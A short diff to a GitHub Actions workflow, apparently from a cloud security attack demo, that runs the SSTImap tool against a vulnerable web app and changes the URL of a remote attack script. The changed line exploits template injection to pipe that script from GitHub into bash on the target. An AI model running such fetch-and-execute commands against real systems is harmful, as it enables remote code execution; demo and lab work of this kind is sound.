@@ -24,4 +24,4 @@ jobs:
               run: |
                 docker run chrisley75/sstimap:1.0.3 \
                   -u "${{ github.event.inputs.APP_URL }}page?name=attack" \
-                  --os-cmd "curl -s https://raw.githubusercontent.com/cloudsec-org/4-webapp-attack-demo/refs/heads/main/vul-app/scripts/cloudlabs-full-attack.sh | bash"
+                  --os-cmd "curl -s https://raw.githubusercontent.com/cortex-cloud-demo/4-webapp-attack-demo/refs/heads/main/vul-app/scripts/cloudlabs-full-attack.sh | bash"
